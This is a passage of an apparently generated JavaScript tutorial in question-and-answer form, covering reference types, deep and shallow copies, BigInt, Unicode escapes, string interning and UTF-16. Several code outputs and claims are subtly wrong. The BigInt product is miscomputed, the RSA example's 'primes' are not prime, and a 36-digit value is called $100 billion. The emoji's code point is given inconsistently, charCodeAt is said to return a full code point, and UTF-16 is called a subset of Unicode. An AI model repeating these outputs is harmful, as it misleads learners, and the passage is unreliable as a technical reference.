2. The second function takes the `greeting` and returns a new function, which when called, logs the full greeting message (e.g., "Good morning, John!").
3. In the example, `greet('John')` creates a function that expects a greeting. Then, `greetJohn('Good morning')` sets the greeting. Finally, calling `greetJohnMorning()` logs the message.

This approach demonstrates how currying can be used to break down the task of constructing a message into separate functions that can be applied step by step.

---

## **Reference Types**

### What are **reference types** in JavaScript? Give an example of a reference type and explain how it differs from a primitive type.

In JavaScript, **reference types** are data types that store references to the memory location where the actual data is stored, rather than the data itself. This means that when you assign a reference type to another variable or pass it to a function, you're working with a reference to the same object, not a copy of it.

### **Key Characteristics of Reference Types**:

- **Stored by reference**: When assigned to a new variable or passed to a function, reference types share the same memory location.
- **Mutable**: The contents of reference types (objects, arrays, etc.) can be changed after they are created.
- **Not copied**: If you assign a reference type to another variable, both variables point to the same object in memory.

### **Examples of Reference Types**:

- **Objects**: Any plain object, arrays, functions, etc.

```javascript
// Example of a reference type: Object
const person = {
  name: "Alice",
  age: 25,
};

// Assigning the object to another variable
const anotherPerson = person;

// Modify the object through the new reference
anotherPerson.age = 30;

console.log(person.age); // Output: 30
console.log(anotherPerson.age); // Output: 30
```

### **Explanation**:

- Both `person` and `anotherPerson` refer to the same object in memory. When you change `anotherPerson.age`, it also changes `person.age` because they point to the same object.

---

### **Primitive Types vs Reference Types**

1. **Primitive Types**:

   - **Stored by value**: When you assign a primitive value to a new variable, you get a copy of that value, not a reference to the original value.
   - **Immutable**: You cannot change the actual value of a primitive after it’s created (though you can create a new one).

   **Examples of primitive types**:

   - `string`, `number`, `boolean`, `null`, `undefined`, `symbol`, `bigint`

```javascript
// Example of a primitive type: Number
let a = 10;
let b = a; // b is assigned a copy of the value of a
b = 20;

console.log(a); // Output: 10 (a is unchanged)
console.log(b); // Output: 20 (b is updated)
```

- Here, `a` and `b` are independent of each other. Changing `b` does not affect `a` because `a` was copied to `b` by value.

### **Summary of Differences**:

| **Characteristic**       | **Primitive Type**                                                     | **Reference Type**                               |
| ------------------------ | ---------------------------------------------------------------------- | ------------------------------------------------ |
| **Storage**              | Stored by value                                                        | Stored by reference                              |
| **Example**              | `string`, `number`, `boolean`, `null`, `undefined`, `symbol`, `bigint` | `object`, `array`, `function`                    |
| **Mutability**           | Immutable                                                              | Mutable                                          |
| **Copying Behavior**     | Copies the value                                                       | Copies the reference (shallow copy)              |
| **Effect of Assignment** | Assigning creates a copy                                               | Assigning creates a reference to the same object |

In short, **primitive types** hold the actual data, whereas **reference types** hold a reference to the memory location where the data is stored, meaning changes to the reference type affect all references to that object.

### How does JavaScript handle **pass-by-reference** with objects? Demonstrate with an example where you modify an object passed to a function.

In JavaScript, **objects** are passed to functions **by reference**, meaning that when you pass an object to a function, the function receives a reference to the original object rather than a copy of it. This allows the function to modify the original object.

### **Pass-by-Reference with Objects:**

When you pass an object to a function, any changes made to the object inside the function will affect the original object outside the function because both the function's parameter and the original object reference the same memory location.

### **Example: Modifying an Object Passed to a Function**

```javascript
// Define an object
const person = {
  name: "Alice",
  age: 25,
};

// Function to modify the object
function updateAge(obj) {
  obj.age = 30; // Modify the age property of the object
  obj.city = "New York"; // Add a new property to the object
}

// Pass the object to the function
updateAge(person);

// Log the original object after modification
console.log(person);
// Output: { name: 'Alice', age: 30, city: 'New York' }
```

### **Explanation:**

- The object `person` is passed to the function `updateAge()`.
- Inside the function, we modify the `age` property of the object and add a new property `city`.
- Since objects are passed by reference, the `person` object outside the function is also modified, reflecting the changes made inside the function.

### **Key Points:**

1. **Reference Passing**: When we pass the `person` object to `updateAge()`, we're passing a reference to the same object, not a copy of it.
2. **Modification**: Any changes made to the object inside the function affect the original object.
3. **Side Effects**: This behavior is different from primitive types, where a copy of the value is passed, and changes inside the function do not affect the original value.

### **Visualizing the Behavior:**

- Before the function call, `person` points to an object in memory.
- When passed to `updateAge()`, the reference to that object is used.
- Modifications inside `updateAge()` are reflected on the original object because both the function's parameter and the original variable (`person`) point to the same memory location.

### **Summary:**

JavaScript handles objects as **pass-by-reference**, meaning the function works directly with the original object, and any modifications made inside the function will reflect outside the function. This is in contrast to **primitive types**, which are passed by value (i.e., copied).

### What are **deep copies** vs **shallow copies** for reference types in JavaScript? Write an example that demonstrates both using `Object.assign()` and `JSON.parse()`.

In JavaScript, **shallow copies** and **deep copies** refer to how objects and their properties are copied. The distinction lies in how nested objects (objects within objects) are handled during the copying process.

### **Shallow Copy**:

- A **shallow copy** of an object creates a new object, but it only copies the references to the nested objects, not the nested objects themselves.
- If the original object contains nested objects or arrays, the shallow copy will still point to the same references for those nested objects.
- Changing the nested properties in the copied object will affect the original object and vice versa.

### **Deep Copy**:

- A **deep copy** creates a new object, and recursively copies all objects and arrays, ensuring that no references to the original objects are preserved.
- This means that even nested objects or arrays are fully cloned, and changes in the copied object will not affect the original object.

### **Demonstrating Shallow Copy (using `Object.assign()`) and Deep Copy (using `JSON.parse()`):**

#### **Shallow Copy using `Object.assign()`**:

`Object.assign()` creates a shallow copy of an object. It copies the values of all enumerable properties from the source object to a target object. For nested objects, only the references are copied.

```javascript
const original = {
  name: "Alice",
  address: { city: "New York", zip: 10001 },
};

// Shallow copy using Object.assign
const shallowCopy = Object.assign({}, original);

// Modify the nested object in shallowCopy
shallowCopy.address.city = "Los Angeles";

console.log(original.address.city); // Output: 'Los Angeles' (Both objects share the same reference)
console.log(shallowCopy.address.city); // Output: 'Los Angeles'
```

- In this case, both `original` and `shallowCopy` share the same `address` object because `Object.assign()` only performs a shallow copy. Modifying the `address` property in the shallow copy also affects the original object.

#### **Deep Copy using `JSON.parse()` and `JSON.stringify()`**:

To create a deep copy, you can use `JSON.stringify()` to convert an object to a string and then use `JSON.parse()` to parse the string back into an object. This process creates a fully independent copy, including nested objects.

```javascript
const original = {
  name: "Alice",
  address: { city: "New York", zip: 10001 },
};

// Deep copy using JSON.parse() and JSON.stringify()
const deepCopy = JSON.parse(JSON.stringify(original));

// Modify the nested object in deepCopy
deepCopy.address.city = "Los Angeles";

console.log(original.address.city); // Output: 'New York' (original object is not affected)
console.log(deepCopy.address.city); // Output: 'Los Angeles'
```

- Here, `JSON.stringify()` converts the original object into a string representation, and `JSON.parse()` reconstructs the object. The `deepCopy` is fully independent of `original`, so changing `deepCopy`'s `address` does not affect `original`.

### **Summary of Differences**:

| **Type of Copy** | **Method**                     | **Effect on Nested Objects**                        | **Behavior**                                                                                                               |
| ---------------- | ------------------------------ | --------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **Shallow Copy** | `Object.assign()`              | Nested objects are copied by reference.             | Changes to nested objects in the copy affect the original object because both reference the same nested object.            |
| **Deep Copy**    | `JSON.parse(JSON.stringify())` | Nested objects are fully cloned (not by reference). | Changes to nested objects in the copy do not affect the original object because a completely new nested object is created. |

### **Limitations of `JSON.parse()` and `JSON.stringify()`**:

- This method only works with objects that can be serialized into JSON. It does not handle non-serializable properties like functions, `undefined`, `Date` objects, `RegExp`, and circular references.
- For handling more complex scenarios, you would need to implement a custom deep copy function or use libraries like **Lodash**'s `_.cloneDeep()`.

In summary:

- **Shallow copy** creates a new object but shares references for nested objects, so changes in nested objects affect both the original and copied objects.
- **Deep copy** fully clones the object and all its nested objects, making the copy completely independent of the original.

## **BigInt**

### What is **BigInt** in JavaScript? How is it different from regular numbers? Write an example of how to create a BigInt.

### **BigInt** in JavaScript:

`BigInt` is a special numeric data type in JavaScript that can represent integers larger than the `Number` type can handle. While the `Number` type in JavaScript (which follows the IEEE 754 double-precision standard) can only safely represent integers between `-2^53 + 1` and `2^53 - 1` (i.e., between `-9007199254740991` and `9007199254740991`), `BigInt` can represent arbitrarily large integers, allowing you to work with integers of any size.

### **Key Differences Between `BigInt` and Regular Numbers**:

1. **Size**:

   - `Number` can only safely handle integers within the range of `-2^53 + 1` to `2^53 - 1`.
   - `BigInt` can represent arbitrarily large integers beyond that range.

2. **Operations**:

   - You cannot mix `BigInt` and `Number` types directly in arithmetic operations. You must explicitly convert them to the same type before performing operations.
   - Arithmetic operations between two `BigInt` values are safe, but mixing `BigInt` with regular `Number` will throw a `TypeError`.

3. **Use Cases**:
   - `BigInt` is useful when you need to perform calculations with very large integers, such as in cryptography, high-precision calculations, or dealing with large data sets like in financial applications.

### **Creating a `BigInt`**:

You can create a `BigInt` in two ways:

1. Using the `BigInt` constructor with a numeric string or integer value.
2. Using the `n` suffix after an integer literal.

### **Example 1: Creating a `BigInt` with the `BigInt` constructor**:

```javascript
// Using BigInt constructor
const bigIntFromString = BigInt("123456789123456789123456789123456789");
console.log(bigIntFromString); // Output: 123456789123456789123456789123456789n
```

### **Example 2: Creating a `BigInt` with the `n` suffix**:

```javascript
// Using BigInt with the 'n' suffix
const bigIntFromSuffix = 123456789123456789123456789123456789n;
console.log(bigIntFromSuffix); // Output: 123456789123456789123456789123456789n
```

### **Operations with `BigInt`**:

```javascript
const bigInt1 = 123456789123456789123456789123456789n;
const bigInt2 = 987654321987654321987654321987654321n;

const sum = bigInt1 + bigInt2;
console.log(sum); // Output: 1111111111111111111111111111111111110n
```

### **Important Notes**:

- **Cannot mix `BigInt` and `Number`**:
  You cannot perform arithmetic operations between a `BigInt` and a `Number` directly. Here's what happens if you try:

```javascript
const bigInt = 123456789123456789123456789123456789n;
const num = 10;

const result = bigInt + num; // Throws TypeError
```

To fix this, you would need to convert the `Number` to a `BigInt`:

```javascript
const result = bigInt + BigInt(num); // Works fine
console.log(result); // Output: 123456789123456789123456789123456799n
```

### **Summary**:

- `BigInt` is a new numeric type in JavaScript that allows you to work with arbitrarily large integers.
- Unlike the `Number` type, which has limitations due to floating-point precision, `BigInt` can represent integers that exceed the safe limits of the `Number` type.
- You can create a `BigInt` using the `BigInt` constructor or by appending the `n` suffix to an integer literal.

### Write an example where you use **BigInt** to perform arithmetic operations on large integers beyond the safe range of `Number` type.

Here's an example where we use **BigInt** to perform arithmetic operations on large integers that exceed the safe range of JavaScript's `Number` type:

### **Example: Using `BigInt` for Arithmetic on Large Integers**

```javascript
// Large numbers beyond the safe range of Number
const largeNum1 = 900719925474099123456789n; // BigInt using the 'n' suffix
const largeNum2 = 900719925474099123456789n; // Another large BigInt

// Performing arithmetic operations with BigInt
const sum = largeNum1 + largeNum2;
const difference = largeNum1 - largeNum2;
const product = largeNum1 * largeNum2;
const quotient = largeNum1 / largeNum2;

// Logging the results
console.log("Sum: " + sum); // Output: 1801439850948198246913578n
console.log("Difference: " + difference); // Output: 0n
console.log("Product: " + product); // Output: 810295861694327790408083309142300877489n
console.log("Quotient: " + quotient); // Output: 1n
```

### **Explanation**:

1. **Large Numbers**: The variables `largeNum1` and `largeNum2` are defined as `BigInt` values using the `n` suffix. These numbers are so large that they cannot be represented accurately using JavaScript's regular `Number` type (which is limited to safe integers between `-2^53 + 1` and `2^53 - 1`).
2. **Arithmetic Operations**:

   - **Sum**: The sum of two `BigInt` numbers is calculated using the `+` operator.
   - **Difference**: Subtraction is performed using the `-` operator.
   - **Product**: Multiplication is performed using the `*` operator.
   - **Quotient**: Division is performed using the `/` operator. Note that division between two `BigInt` values results in a `BigInt` and truncates the result (i.e., no decimal part).

3. **Output**:
   - The arithmetic operations work as expected, with results printed out using `BigInt`'s syntax.
   - Since these numbers are larger than the maximum safe integer for JavaScript's `Number` type, using `BigInt` allows for safe and accurate calculations without any loss of precision.

### **Key Takeaways**:

- `BigInt` can be used to handle integers larger than what JavaScript's `Number` type can safely represent (larger than `2^53 - 1`).
- You can perform arithmetic operations on `BigInt` values just like regular numbers, but you must ensure that both operands are `BigInt` when performing arithmetic.
- **Important**: You cannot mix `BigInt` and `Number` in arithmetic operations directly. If needed, convert `Number` to `BigInt` using `BigInt(num)`.

### Explain how **BigInt** is used in JavaScript when dealing with large integers in cryptography or financial applications.

In **cryptography** and **financial applications**, large integers are commonly used for tasks such as encrypting data, generating keys, performing calculations on large amounts of money, and handling precise financial transactions. JavaScript's **BigInt** type is extremely useful for these purposes because it allows you to work with arbitrarily large integers, overcoming the limitations of the `Number` type, which can only represent integers safely within a range of `-2^53 + 1` to `2^53 - 1`.

### **1. BigInt in Cryptography**:

Cryptographic algorithms often require operations on very large numbers, especially when generating keys or encrypting/decrypting data using techniques like RSA, elliptic curve cryptography, or Diffie-Hellman key exchange. These algorithms depend on arithmetic operations that involve numbers far larger than what JavaScript's `Number` type can handle, which is where `BigInt` becomes essential.

#### **Example of BigInt in RSA Key Generation**:

RSA key generation involves finding two large prime numbers and performing mathematical operations such as modular exponentiation and modular multiplication. These operations require precise calculations with very large integers.

```javascript
// Example of RSA-like encryption, just to illustrate using BigInt for large integers
const bigPrime1 = BigInt(
  "123456789123456789123456789123456789123456789123456789"
);
const bigPrime2 = BigInt(
  "987654321987654321987654321987654321987654321987654321"
);

// Calculate the product (n = p * q)
const n = bigPrime1 * bigPrime2;

// Calculate Euler's Totient (phi = (p - 1) * (q - 1))
const phi = (bigPrime1 - 1n) * (bigPrime2 - 1n);

// Public and private keys are derived using large numbers
const e = 65537n; // Common public exponent
const d = modInverse(e, phi); // Private key (modular inverse of e modulo phi)

// Simple modular exponentiation for encryption or decryption
function modInverse(a, m) {
  let m0 = m;
  let x0 = 0n,
    x1 = 1n;
  if (m === 1n) return 0n;

  while (a > 1n) {
    let q = a / m;
    let t = m;
    m = a % m;
    a = t;
    t = x0;
    x0 = x1 - q * x0;
    x1 = t;
  }

  if (x1 < 0n) x1 += m0;
  return x1;
}

console.log("n (modulus for public key):", n);
console.log("phi (Euler's Totient):", phi);
console.log("Public Key e:", e);
console.log("Private Key d:", d);
```

#### **Explanation**:

- **Large Prime Numbers**: `bigPrime1` and `bigPrime2` are two large prime numbers used in RSA key generation.
- **Modular Arithmetic**: Key operations like finding the product (`n`), Euler's Totient (`phi`), and the modular inverse (`d`) require precise handling of large integers.
- **BigInt**: `BigInt` ensures that the calculations do not lose precision, even with extremely large numbers.

### **2. BigInt in Financial Applications**:

In financial applications, especially those involving cryptocurrencies or precise accounting systems, it is critical to handle numbers with a high degree of accuracy. For instance, cryptocurrencies like Bitcoin use `BigInt`-like structures to represent balances, as small precision errors can lead to significant issues with transaction amounts or balances over time.

#### **Example of BigInt in Financial Calculations**:

Consider an example where you need to calculate the balance in a financial system after performing multiple transactions. In such cases, the transaction amounts might involve very large values, such as in the case of handling digital currencies or assets.

```javascript
// Example: Handling large financial transactions with BigInt

// Transaction amounts
const deposit = BigInt("100000000000000000000000000000000000"); // $100 billion
const withdrawal = BigInt("25000000000000000000000000000000000"); // $25 billion

// Account balance starts at $0
let balance = BigInt(0);

// Perform deposit
balance += deposit;
console.log("After deposit, balance is:", balance.toString()); // Balance = $100 billion

// Perform withdrawal
balance -= withdrawal;
console.log("After withdrawal, balance is:", balance.toString()); // Balance = $75 billion
```

#### **Explanation**:

- **Large Transaction Values**: In this example, `BigInt` is used to handle transactions involving very large amounts of money, such as billions of dollars.
- **Accurate Financial Calculations**: Using `BigInt` ensures that even very large financial amounts are represented accurately, avoiding rounding errors or loss of precision.

### **Why BigInt is Essential in Cryptography and Finance**:

1. **Precision**: `BigInt` allows you to handle large integers without losing precision, which is crucial for cryptographic algorithms and financial applications where even tiny rounding errors can have significant consequences.
2. **Arbitrary Size**: Unlike JavaScript's `Number`, which has a limit for integer size, `BigInt` can handle integers of arbitrary size, allowing for computations involving very large numbers like encryption keys or high-value financial transactions.
3. **Safe Operations**: With `BigInt`, you can safely perform operations like modular arithmetic, encryption/decryption, or balancing calculations that would otherwise overflow or cause errors using `Number`.

### **Challenges with BigInt**:

- **Performance**: While `BigInt` is very useful for large numbers, it may not be as performant as `Number` for smaller values because of the overhead associated with managing large integers.
- **Compatibility**: `BigInt` is not supported in all environments, so in some cases, you may need to handle compatibility or fall back to libraries that simulate large integers for older JavaScript engines.

### **Conclusion**:

In summary, `BigInt` is a powerful feature in JavaScript for handling large integers, making it ideal for **cryptographic applications** that require large prime numbers and **financial applications** that need precise calculations with large monetary values. It ensures that you can handle arbitrarily large numbers without losing precision, making it essential for these high-stakes applications.

### Can you mix **BigInt** and regular `Number` types in operations? Demonstrate with an example and explain the result.

No, you cannot mix **BigInt** and regular `Number` types directly in arithmetic operations in JavaScript. This is because they are fundamentally different types, and JavaScript does not automatically convert between them for safety reasons.

### **Example of Mixing BigInt and Number**:

```javascript
const bigNumber = BigInt(1000000000000000000); // A large BigInt
const regularNumber = 100; // A regular Number

// Attempting to add a BigInt and a Number will throw a TypeError
const sum = bigNumber + regularNumber; // Error: Cannot mix BigInt and other types
console.log(sum);
```

### **Explanation**:

- When trying to perform an operation like `bigNumber + regularNumber`, JavaScript will throw a `TypeError` because **BigInt** and `Number` are not automatically interoperable in arithmetic operations.
- The error message is typically: `Cannot mix BigInt and other types`.

### **How to Handle Mixing BigInt and Number**:

To perform operations between `BigInt` and `Number`, you must explicitly convert one type to the other.

1. **Convert `Number` to `BigInt`**:
   You can convert a regular `Number` to a `BigInt` using `BigInt()`.

   ```javascript
   const bigNumber = BigInt(1000000000000000000); // A large BigInt
   const regularNumber = 100; // A regular Number

   // Convert the Number to BigInt
   const sum = bigNumber + BigInt(regularNumber);
   console.log(sum); // Output: 1000000000000000100n
   ```

2. **Convert `BigInt` to `Number`**:
   You can also convert a `BigInt` to a `Number` (with caution, since this might lose precision if the `BigInt` is too large).

   ```javascript
   const bigNumber = BigInt(1000000000000000000); // A large BigInt
   const regularNumber = 100; // A regular Number

   // Convert the BigInt to Number (note: this may lose precision if the BigInt is too large)
   const sum = Number(bigNumber) + regularNumber;
   console.log(sum); // Output: 1000000000000000100
   ```

   However, **converting a very large `BigInt` to `Number` can result in loss of precision**, as JavaScript's `Number` type only supports safe integers up to `2^53 - 1`.

### **Conclusion**:

- **BigInt** and regular `Number` types cannot be mixed directly in operations. You need to explicitly convert one type to the other to avoid errors.
- Converting a `Number` to `BigInt` is generally safe, but converting a large `BigInt` to a `Number` may cause precision issues if the `BigInt` exceeds the safe integer limit. Always be cautious when doing such conversions, especially with large numbers.

## **Unicode, String Internals**

### What is **Unicode** in JavaScript? How does JavaScript handle Unicode characters in strings? Write an example of how to represent a string with special Unicode characters.

**Unicode** is a universal character encoding standard that allows for the representation of text in multiple writing systems, including symbols, letters, and characters from various languages. It provides a unique number (code point) for every character, regardless of the platform, program, or language. In JavaScript, strings are encoded in **UTF-16**, which is a subset of Unicode. This allows JavaScript to handle a wide range of characters, including those from non-Latin scripts (like Chinese, Arabic, etc.), emojis, and other symbols.

### **Handling Unicode in JavaScript**:

JavaScript uses **UTF-16** encoding for its string representation, which means:

- Most characters are represented by a **single 16-bit unit**.
- Some characters, such as emojis or rare characters, require **two 16-bit units** (a "surrogate pair").

JavaScript provides several ways to work with Unicode characters in strings:

- **Escape sequences**: Unicode characters can be represented using escape sequences like `\u` (for characters in the Basic Multilingual Plane) or `\u{}` (for characters outside the Basic Multilingual Plane).
- **String methods**: JavaScript string methods, like `charCodeAt()`, `fromCharCode()`, and `codePointAt()`, allow you to access or manipulate Unicode characters directly.

### **Example of Representing Special Unicode Characters**:

Let's represent and manipulate a string with special Unicode characters, including emojis and non-Latin characters.

```javascript
// Representing a string with Unicode characters
const helloWorld = "Hello, world! 🌍";

// Using Unicode escape sequences
const unicodeString =
  "\u0048\u0065\u006C\u006C\u006F, \u0077\u006F\u0072\u006C\u0064! \uD83C\uDF0D";

// Using code point escape (for characters outside the BMP)
const emojiString = "\u{1F30D}"; // 🌍

// Displaying the strings
console.log(helloWorld); // Output: Hello, world! 🌍
console.log(unicodeString); // Output: Hello, world! 🌍 (same as above)
console.log(emojiString); // Output: 🌍

// Accessing individual characters by Unicode code points
const firstChar = helloWorld.codePointAt(0); // 'H' (code point: 72)
const emojiChar = helloWorld.codePointAt(14); // '🌍' (code point: 127757)

console.log(firstChar); // Output: 72 (Unicode code point for 'H')
console.log(emojiChar); // Output: 127757 (Unicode code point for '🌍')

// Converting code points back to characters
const firstCharStr = String.fromCodePoint(firstChar);
const emojiCharStr = String.fromCodePoint(emojiChar);

console.log(firstCharStr); // Output: H
console.log(emojiCharStr); // Output: 🌍
```

### **Explanation**:

1. **Unicode Escape Sequences**:

   - `\u0048` represents the Unicode code point for `'H'`.
   - `\uD83C\uDF0D` represents the surrogate pair for the emoji `🌍` (Earth Globe Europe-Africa).
   - The escape sequence `\u{1F30D}` is used for characters outside the Basic Multilingual Plane (BMP) like the Earth emoji, which is represented by code point `1F30D` and requires more than 16 bits.

2. **Accessing Unicode Code Points**:

   - The `codePointAt(index)` method retrieves the Unicode code point at the specified index, which is useful for handling characters outside the BMP (like emojis).
   - We can also convert a Unicode code point back into a character using `String.fromCodePoint()`.

3. **Surrogate Pairs**:
   - Some characters, like the Earth emoji (`🌍`), are represented by surrogate pairs in UTF-16. When you use `codePointAt()`, it correctly identifies the entire character, even though it's stored as two 16-bit units.

### **Key Points**:

- **UTF-16 Encoding**: JavaScript uses UTF-16 to represent strings, meaning most characters are one 16-bit unit, but some require two (e.g., emojis or characters outside the BMP).
- **Unicode Escape Sequences**: Use `\u` for 4-digit Unicode escapes and `\u{}` for longer Unicode escapes (for code points beyond `\uFFFF`).
- **String Methods**: Methods like `codePointAt()` and `fromCodePoint()` help handle characters outside the basic character set, such as emojis or rare symbols.

By using Unicode, JavaScript can handle and display a wide range of characters from different languages and symbol sets, making it highly versatile for internationalization and modern web development.

### How can you convert a string into a **Unicode code point** and back into a character in JavaScript? Write an example using `String.fromCodePoint()` and `charCodeAt()`.

To convert a string into a **Unicode code point** and then back into a character in JavaScript, you can use the following methods:

1. **`charCodeAt()`**: This method returns the UTF-16 code unit (or code point for characters in the Basic Multilingual Plane) at a given index.
2. **`String.fromCodePoint()`**: This method takes one or more Unicode code points and returns a string created by those code points.

### **Example**:

```javascript
// Example string
const str = "Hello, 🌍";

// Convert a string into its Unicode code points using charCodeAt
const codePoints = [];
for (let i = 0; i < str.length; i++) {
  // Check if the character is a surrogate pair
  const codePoint = str.codePointAt(i);
  codePoints.push(codePoint);

  // If the character is a surrogate pair, skip the second unit
  if (codePoint > 0xffff) {
    i++; // Move past the second part of the surrogate pair
  }
}

console.log("Unicode Code Points: ", codePoints);
// Output: Unicode Code Points: [ 72, 101, 108, 108, 111, 44, 32, 128187 ]

// Convert Unicode code points back into a string using fromCodePoint
const newString = String.fromCodePoint(...codePoints);
console.log("String from Code Points: ", newString);
// Output: String from Code Points: Hello, 🌍
```

### **Explanation**:

1. **`codePointAt(i)`**:

   - This method returns the Unicode code point for a character at index `i` in the string. For characters that are part of a surrogate pair (like emojis), it returns the full code point instead of just the 16-bit code unit.
   - In the string `"Hello, 🌍"`, `🌍` is represented by a surrogate pair in UTF-16. `codePointAt()` returns the complete code point `128187` for this emoji.

2. **`String.fromCodePoint()`**:
   - This method takes one or more code points and returns a string created from those code points.
   - In the example, we convert the array of code points back into the original string by passing the code points into `String.fromCodePoint()`. Note that `String.fromCodePoint(...codePoints)` is used to spread the array of code points as individual arguments to the method.

### **Key Points**:

- `charCodeAt(i)` gives you the 16-bit code unit at a given position in the string. However, for characters outside the Basic Multilingual Plane (like emojis), you need to handle surrogate pairs.
- `codePointAt(i)` is a better choice when dealing with characters beyond the BMP, as it returns the complete Unicode code point.
- `String.fromCodePoint()` allows you to convert Unicode code points back into their corresponding characters, including those that require surrogate pairs (like emojis).

This way, you can easily work with Unicode code points in JavaScript, especially when dealing with characters from multiple languages, emojis, or special symbols.

### Explain **String Internals** in JavaScript. How does string interning work, and how does it affect memory usage? Provide an example where string interning is beneficial.

**String Interning** is a process in JavaScript (and many other programming languages) where identical string literals are stored in a single memory location, rather than allocating new memory each time the same string is used. The idea behind string interning is to optimize memory usage by reusing the memory for identical strings, which reduces both memory consumption and improves performance in some cases.

### **How String Interning Works**:

1. **Immutable Strings**: In JavaScript, strings are immutable, meaning that once a string is created, it cannot be changed. This makes strings perfect candidates for interning because we don't need to worry about the string's value changing after it is stored.
2. **Automatic Interning**: JavaScript engines, like V8 (used in Chrome and Node.js), automatically "intern" string literals. This means that if you create multiple variables with the same string literal, the engine may store the literal string only once in memory.
3. **String Interning Table**: Interned strings are typically stored in an internal table or pool. When a string literal is used, the engine checks if it's already in the table. If it is, the engine will return the reference to the already-stored string. If it isn't, the engine adds it to the table.

### **Memory Usage**:

- **Without String Interning**: If strings are not interned, each string creation will allocate new memory even for identical strings.
- **With String Interning**: Identical string literals will point to the same memory location, reducing memory usage.

### **Benefits of String Interning**:

- **Memory Efficiency**: By reusing string literals, the engine reduces the need to allocate memory for the same value repeatedly.
- **Performance**: Interned strings can be compared by reference (pointer comparison) rather than value comparison, leading to faster string equality checks.

### **Example of String Interning in JavaScript**:

```javascript
// Using identical string literals
const str1 = "hello";
const str2 = "hello";
const str3 = "hello";

// Comparing the strings
console.log(str1 === str2); // true (both point to the same memory reference)
console.log(str1 === str3); // true (both point to the same memory reference)

// Check if the strings are the same object in memory
console.log(str1 === str2); // true, because they refer to the same memory location
console.log(str1 === str3); // true, because they refer to the same memory location
```

### **Explanation**:

- In the example, when you declare `str1`, `str2`, and `str3` as `"hello"`, JavaScript will likely optimize the memory usage by interning the string `"hello"`. All three variables will point to the same memory location, meaning they refer to the same object in memory.
- When performing comparisons like `str1 === str2`, JavaScript will compare the memory references (pointers) rather than comparing the string values. Since they point to the same memory location, the comparison is true.

### **When String Interning is Beneficial**:

String interning is particularly beneficial in scenarios where:

- **There are many repeated string literals**: If a large application uses many identical string literals, interning can significantly reduce memory usage.
- **Frequent string comparisons**: When strings are used in equality checks, interning can make the comparison faster because it compares memory addresses (pointers) instead of values.

### **Example Where String Interning is Beneficial**:

Consider a scenario where you have a large number of repeated string values, such as status codes in an application:

```javascript
const statusCodes = [
  "OK",
  "OK",
  "ERROR",
  "ERROR",
  "NOT_FOUND",
  "ERROR",
  "OK",
  "OK",
];

// Without interning, we have multiple memory allocations for the same strings.
```

Interning the strings would ensure that all identical status codes like `"OK"`, `"ERROR"`, and `"NOT_FOUND"` are stored only once in memory. This reduces memory overhead, especially when the application grows large and has repeated values.

### **Limitations**:

- **Not All Strings Are Interned**: Only string literals are automatically interned by JavaScript engines. Dynamically generated strings (e.g., strings created by concatenation or through functions) are not interned.
- **Manual Interning**: JavaScript does not expose a built-in mechanism to manually "intern" strings, but some engines may provide optimizations for this.

In summary, **string interning** helps reduce memory usage and improves performance by reusing identical string literals instead of creating new objects for each instance of the same string.

### What is the difference between **UTF-8** and **UTF-16** encodings in JavaScript? How does JavaScript manage multi-byte characters in strings?

**UTF-8** and **UTF-16** are both character encoding schemes used to represent text in JavaScript, but they differ in how they encode characters and handle multi-byte characters.

### **UTF-8** vs **UTF-16**:

1. **UTF-8**:

   - **Variable Length Encoding**: UTF-8 is a variable-length encoding scheme. It uses one to four bytes to encode a character.
     - Characters from the ASCII range (0-127) are encoded in one byte.
     - Characters outside this range are encoded with two, three, or four bytes, depending on the character.
   - **Efficiency**: For characters in the ASCII range, UTF-8 is more space-efficient than UTF-16, as it only uses one byte per character.
   - **Backward Compatibility**: UTF-8 is backward compatible with ASCII. This makes it widely used for encoding web content and ensuring compatibility with older systems.
   - **Common Use Cases**: UTF-8 is widely used for encoding web pages (HTML, JSON, etc.), files, and is the default encoding for most web technologies.

2. **UTF-16**:
   - **Variable Length Encoding**: UTF-16 is also a variable-length encoding scheme, but it uses one or two 16-bit units (two or four bytes) to represent a character.
     - Characters in the Basic Multilingual Plane (BMP), which includes most common characters, are encoded in one 16-bit unit (2 bytes).
     - Characters outside the BMP, such as emojis and certain rare symbols, require two 16-bit units (a surrogate pair, totaling 4 bytes).
   - **Efficiency**: UTF-16 can be less efficient for encoding characters that fall within the ASCII range because it always uses two bytes (compared to one byte in UTF-8).
   - **Common Use Cases**: UTF-16 is commonly used in environments like Windows, Java, and JavaScript (for internal string representation in most JavaScript engines).

### **How JavaScript Handles Multi-Byte Characters**:

JavaScript strings are stored internally as **UTF-16** encoded sequences. This means that:

- Characters in the Basic Multilingual Plane (BMP) are represented using a single 16-bit code unit (2 bytes).
- Characters outside the BMP (like emojis, certain rare symbols, and some languages) are represented using **surrogate pairs**—two 16-bit code units.

For example, the emoji `🌍` (Earth Globe emoji) is encoded using two 16-bit units in UTF-16.

### **Example with UTF-16 Encoding in JavaScript**:

```javascript
// Example string with a basic ASCII character and an emoji (outside BMP)
const str = "Hello, 🌍";

// Length in terms of 16-bit code units (UTF-16)
console.log(str.length); // Output: 9 (This counts code units, not actual characters)

// Accessing individual code units
console.log(str.charCodeAt(0)); // Output: 72 (Unicode for 'H')
console.log(str.charCodeAt(7)); // Output: 127757 (First unit of the surrogate pair for '🌍')

// Accessing the emoji character
console.log(str[7] + str[8]); // Output: 🌍 (concatenating surrogate pairs forms the emoji)

// Checking code point of the emoji
console.log(str.codePointAt(7)); // Output: 128187 (Unicode code point for '🌍')
```

### **Explanation**:

- `str.length`: Returns 9, which is the number of **16-bit code units** in the string. Each basic character (like 'H') occupies one 16-bit unit, but the emoji `🌍` uses **two 16-bit units** (a surrogate pair).
- `charCodeAt()`: This method returns the individual **16-bit code unit**. For the emoji, we get the first code unit of the surrogate pair (for `🌍`), which is `127757`.
- `codePointAt()`: Returns the **actual Unicode code point** for the emoji. This method is useful for dealing with characters outside the BMP since it can combine surrogate pairs to give the full code point.

### **Key Differences in Handling Multi-Byte Characters**:

1. **UTF-8** uses one to four bytes per character, while **UTF-16** uses either one 16-bit unit (2 bytes) or two 16-bit units for characters outside the BMP.
2. **JavaScript's internal string representation** uses UTF-16. As a result, characters that require multiple bytes in UTF-8 (such as emojis) are often represented as surrogate pairs in UTF-16.
3. When working with strings containing multi-byte characters, methods like `charCodeAt()` and `codePointAt()` are used to access code units or code points. For multi-byte characters outside the BMP (like emojis), `charCodeAt()` might return the first part of a surrogate pair, and you need to account for surrogate pairs when working with them.
